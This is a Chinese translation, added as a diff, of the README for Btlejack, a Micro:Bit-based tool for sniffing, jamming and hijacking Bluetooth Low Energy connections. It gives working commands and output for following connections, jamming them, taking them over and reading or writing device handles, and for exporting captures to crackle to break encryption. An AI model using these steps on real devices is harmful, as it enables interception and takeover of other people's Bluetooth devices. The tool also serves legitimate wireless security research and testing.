@@ -1,0 +1,340 @@
+**Btlejack可以为你提供嗅探、干扰和劫持低功耗蓝牙设备所需的一切。它依赖于一个或多个[BBC
+Micro:Bit](http://microbit.org/)。运行专用固件的设备。你可能还想使用[Adafruit的Bluefruit
+LE嗅探器](https://www.adafruit.com/product/2269)或[nRF51822评估套件](https://www.waveshare.com/wiki/BLE400)，我们增加了对这些设备的支持。**
+
+该工具的当前版本（2.0）支持BLE 4.x和5.x。但对BLE5.x的支持有限，因为它仅支持1Mbps未编码PHY模式，并且不支持channel
+map的更新。
+
+##  环境要求
+
+你需要一个基于UNIX的系统（例如Raspberry Pi）。如果你使用BBC
+Micro:Bit，则需要一到三个Micro:Bit设备（建议使用三个），并且每个设备都有一个空闲的USB端口。Micro:Bit的功耗相当低，因此你可以使用单个USB端口和无源集线器为推荐的三个单元供电。
+
+如果你在电脑上同时连接3个microbits，Btlejack将能够嗅到每个advertising channel，并且有更多机会捕获连接请求。
+
+##  安装
+
+首先，使用Pip安装btlejack Python3客户端软件：
+
+    
+    
+    $ sudo pip3 install btlejack
+
+然后，使用USB线将Micro:Bit设备连接到计算机，安装相关的大容量存储设备（挂载点必须包含MICROBIT），并执行以下命令：
+
+    
+    
+    $ btlejack -i
+
+这将对连接到你计算机的各个Micro:Bit设备进行编程，让它们可以同Btlejack一起使用。它将使用当前客户端软件的正确固件版本，因此强烈建议你在每次更新Btlejack时，执行此固件安装过程。
+
+如果你使用的是Bluefruit LE嗅探器或nRF51822评估套件，请使用外部SWD
+programmer[使用此固件](https://github.com/virtualabs/btlejack-firmware/raw/master/dist/btlejack-firmware-ble400.hex)flash你的设备。
+
+让你的设备保持连接状态！
+
+**注意：** 这仅适用于与posix兼容的系统。
+
+##  使用
+
+Btlejack可以：
+
+> 使用各种设备
+>
+> 嗅探现有的BLE连接
+>
+> 嗅探新的BLE连接
+>
+> 干扰现有的BLE连接
+>
+> 劫持现有的BLE连接
+
+将捕获的数据包导出为各种PCAP格式
+
+###  **指定要使用的设备**
+
+Btlejack通常会尝试自动检测并使用连接的兼容设备（目前仅为Micro:Bit），但由于固件可以被黑客攻击或修改以与其他基于nRF51822的主板配合使用，因此它提供了允许与这些设备兼容的特定选项。
+
+-d选项允许你使用Btlejack指定一个或多个设备。请注意，该选项将禁用设备的自动检测，你应该根据自身需要添加任意数量的设备：
+    
+    
+    $ btlejack -d /dev/ttyACM0 -d /dev/ttyACM2 -s
+
+###  **嗅探现有连接**
+
+首先，使用btlejack查找到目标的现有连接：
+
+    
+    
+    $ btlejack -s
+    BtleJack version 1.1
+    [i] Enumerating existing connections ...
+    [ - 54 dBm] 0xcd91d517 | pkts: 1
+    [ - 46 dBm] 0xcd91d517 | pkts: 2
+
+第一个值（以dBm为单位）表示信号的功率，该值越大，嗅探连接就越好。
+
+第二个值（hex十六进制）是关联的访问地址，一个32位值，用于标识两个蓝牙低功耗兼容设备之间的链接。
+
+最后一个值是使用此访问地址看到的数据包数。该值越高，使用相应访问地址的可能性就越大。
+
+然后，使用-f选项跟踪特定连接：
+
+    
+    
+    $ btlejack -f 0xdda4845e
+    BtleJack version 1.1
+    [i] Detected sniffers:
+     > Sniffer #0: fw version 1.1
+    [i] Synchronizing with connection 0xdda4845e ...
+    ✓ CRCInit: 0x2a035e
+    ✓ Channel Map = 0x1fffffffff
+    ✓ Hop interval = 39
+    ✓ Hop increment = 15
+    [i] Synchronized, packet capture in progress ...
+    LL Data: 02 07 03 00 04 00 0a 03 00
+    LL Data: 0a 08 04 00 04 00 0b 5a 69 70
+    LL Data: 02 07 03 00 04 00 0a 03 00
+    LL Data: 0a 08 04 00 04 00 0b 5a 69 70
+
+如果你使用超过1个microbit，Btlejack将并行化一些嗅探操作，以加快连接参数的恢复！
+
+###  **对新连接的嗅探**
+
+btlejack支持的-c选项允许你指定目标BD地址，或者你也可以使用any来捕获创建的任何新连接。
+
+    
+    
+    $ btlejack -c any
+    BtleJack version 1.1
+    [i] Detected sniffers:
+     > Sniffer #0: version 1.1
+     > Sniffer #1: version 1.1
+    LL Data: 05 22 df b4 6f 95 c5 55 c0 0a f6 99 23 40 1d 7b 2f 0a 9a f4 93 01 12 00 27 00 00 00 d0 07 ff ff ff ff 1f 0b
+    [i] Got CONNECT_REQ packet from 55:c5:95:6f:b4:df to 40:23:99:f6:0a:c0
+     |-- Access Address: 0x0a2f7b1d
+     |-- CRC Init value: 0x93f49a
+     |-- Hop interval: 39
+     |-- Hop increment: 11
+     |-- Channel Map: 1fffffffff
+     |-- Timeout: 20000 ms
+    LL Data: 03 09 08 0f 00 00 00 00 00 00 00
+    LL Data: 03 09 08 0f 00 00 00 00 00 00 00
+    LL Data: 0b 06 0c 08 0f 00 09 41
+    LL Data: 03 06 0c 07 1d 00 d3 07
+
+或者你可能还想指定目标BD地址：
+
+    
+    
+    $ btlejack -c 03:e1:f0:00:11:22
+
+###  干扰连接
+
+一旦通过其访问地址标识了连接，就可以使用-j选项对其进行干扰：
+
+    
+    
+    $ btlejack -f 0x129f3244 -j̀
+
+###  **劫持 BLE 连接**
+
+你也可以使用-t选项来劫持现有连接。一旦被劫持，Btlejack会给你一个提示，允许你与被劫持的设备进行交互。
+
+首先，劫持现有连接：
+
+    
+    
+    $ btlejack -f 0x9c68fd30 -t -m 0x1fffffffff
+    BtleJack version 1.1
+    [i] Using cached parameters (created on 2018-08-11 01:48:24)
+    [i] Detected sniffers:
+     > Sniffer #0: fw version 1.1
+    [i] Synchronizing with connection 0x9c68fd30 ...
+    ✓ CRCInit: 0x81f733
+    ✓ Channel map is provided: 0x1fffffffff
+    ✓ Hop interval = 39
+    ✓ Hop increment = 9
+    [i] Synchronized, hijacking in progress ...
+    [i] Connection successfully hijacked, it is all yours \o/
+    btlejack>
+
+然后使用以下命令与设备交互：- discover:执行services 和 characteristics枚举，将为你提供有关服务和特征的所有信息-write:将数据写入特定值句柄- read:从特定值句柄读取数据- ll:发送原始链路层数据包（用于ninjas）
+
+###  **discover 命令**
+
+discover命令将发送和接收蓝牙LE数据包，并检索所有服务UUID和参数，以及特征UUID和参数：
+
+    
+    
+    btlejack> discover
+    start: 0001 end: 0005
+    start: 0014 end: 001a
+    start: 0028 end: ffff
+     Discovered services:
+    Service UUID: 1801
+     Characteristic UUID: 2a05
+       | handle: 0002
+       | properties: indicate  (20)
+       \ value handle: 0003
+    Service UUID: 1800
+     Characteristic UUID: 2a04
+       | handle: 0019
+       | properties: read  (02)
+       \ value handle: 001a
+     Characteristic UUID: 2a00
+       | handle: 0015
+       | properties: read  (02)
+       \ value handle: 0016
+     Characteristic UUID: 2a01
+       | handle: 0017
+       | properties: read  (02)
+       \ value handle: 0018
+    Service UUID: 1824
+     Characteristic UUID: 2abc
+       | handle: 0029
+       | properties: write indicate  (28)
+       \ value handle: 002a
+
+###  **read 命令**
+
+read命令接受单个参数，即与要从中读取的特征对应的值句柄：
+
+    
+    
+    btlejack> read 0x16
+    read>> 4c 47 20 77 65 62 4f 53 20 54 56
+
+###  **write 命令**
+
+write命令接受三个参数：
+
+    
+    
+    btlejack> write <value handle> <data format> <data>
+
+支持的数据格式：
+
+> hex：十六进制数据（即“414261”）
+>
+> str：文本字符串，可以用双引号括起来
+
+###  **ll 命令**
+
+最后一个命令允许你以十六进制形式发送蓝牙低功耗链路层PDU，如第6卷第B部分第2.4章中所述。
+
+###  **PCAP 文件导出**
+
+Btlejack的一个有趣特性是可以将捕获的数据导出到PCAP文件。
+
+Btlejack支持以下DLT格式：
+
+> DLT_BLUETOOTH_LE_LL_WITH_PHDR
+>
+> DLT_NORDIC_BLE
+>
+> DLT_BLUETOOTH_LE_LL
+
+可以使用-o选项指定输出文件，而输出格式可以使用-x选项指定。有效格式值为：ll_phdr, nordic, 或 pcap（默认值）。
+
+    
+    
+    $ btlejack -f 0xac56bc12 -x nordic -o capture.nordic.pcap
+
+ll_phdr导出类型在嗅探加密连接时非常有用，因为它也受到crackle的支持。因此，如果你想嗅探并断开加密的连接，这是一个很好的选择。
+
+你可能还需要使用-s选项告诉crackle使用特定的破解策略：
+
+    
+    
+    $ crackle -i some.pcap -s 1
+
+###  **连接缓存**
+
+Btlejack使用连接缓存来存储一些与连接相关的值，以提升速度。此连接缓存可能会导致一些问题，尤其是在已看到访问地址的情况下。
+
+可以使用-z选项刷新此缓存：
+
+    
+    
+    $ btlejack -z
+
+###  **使用 Wireshark 转储实时数据包**
+
+Btlejack 2.0引入了一个新的-w选项，允许你指定FIFO路径（存在或不存在）以执行数据包的实时分析：
+
+    
+    
+    $ btlejack -c any -w /tmp/blepipe
+
+你甚至可以同时使用FIFO和输出文件：
+
+    
+    
+    $ btlejack -c any -w /tmp/blepipe -o blepackets.pcap
+
+###  **Raspberry Pi 上使用 btlejack 提示**
+
+如果你之前已通过USB启用虚拟以太网（RNDIS），例如要通过USB设置Raspberry Pi Zero
+W，则需要再次禁用它（即从boot/config.txt中删除dtoverlay=dwc2，以及从boot/cmdline.txt中删除modules-load=dwc2,g_ether，然后重启sudo），否则会干扰嗅探器的USB连接。
+
+##  Bluetooth LE 5 & 5.1 支持
+
+此版本支持蓝牙低功耗版本5和5.1，尤其是版本5（CSA
+#2）中引入的新信道选择算法。但是，由于使用的硬件不支持从版本5添加的两个新PHY，因此它只能使用1Mbps未编码PHY模式来嗅探，干扰和劫持连接。
+
+另外请注意，Btlejack中包含的CSA #2的当前实现暂不支持channel map更新。
+
+###  **嗅探新的 BLE 5 连接**
+
+Btlejack会自动检测所使用的信道选择算法，因此你不必担心，只需像往常一样捕获数据包。
+
+###  **嗅探现有的 BLE 5 连接**
+
+嗅探现有的BLE 5连接（使用1Mbps未编码PHY模式，仅此PHY）并不是那么困难。首先，你必须使用-5选项指定要BLE
+5连接目标。注意，无法判断现有连接是否使用CSA #2 或 CSA #1，因此你必须尝试这两种技术，直到其中一种方法起作用。
+
+    
+    
+    $ btlejack -f 0x11223344 -5
+
+然后，Btlejack将恢复使用的channel map及跃点间隔值：
+
+    
+    
+    $ btlejack -f 0x11223344 -5
+    [i] Synchronizing with connection 0x11223344 ...
+    ✓ CRCInit: 0x40d64f
+    ✓ Channel Map = 0x1fffffffff
+    ✓ Hop interval = 160
+
+然后它会尝试恢复此连接的PRNG计数器值：
+
+    
+    
+    $ btlejack -f 0x11223344 -5
+    [i] Synchronizing with connection 0x11223344 ...
+    ✓ CRCInit: 0x40d64f
+    ✓ Channel Map = 0x1fffffffff
+    ✓ Hop interval = 160
+    ✓ CSA2 PRNG counter = 5137
+    [i] Synchronized, packet capture in progress ...
+
+完成后，Btlejack将与此连接同步并处理数据包。
+
+###  **干扰现有的 BLE 5 连接**
+
+这里没有什么新的东西，除了你必须使用-5选项指定攻击的BLE 5连接。
+
+注意，你可以通过分别使用-m和-p标志来指定要使用的channel map和跃点间隔值来优化此攻击。两者必须同时提供，除非它们不起作用。
+
+###  **劫持现有的 BLE 5 连接**
+
+此时我没有设法劫持BLE 5连接，因为此攻击具有时效性。我的BLE 5设备使用0延迟，因此不会延迟并导致此攻击失败。
+
+当我获取到一些合法的BLE 5设备时，我会改进这一点。
+
+***参考来源：[GitHub](https://github.com/virtualabs/btlejack)，FB小编secist编译，转载请注明来自FreeBuf.COM**  
+
+  
+
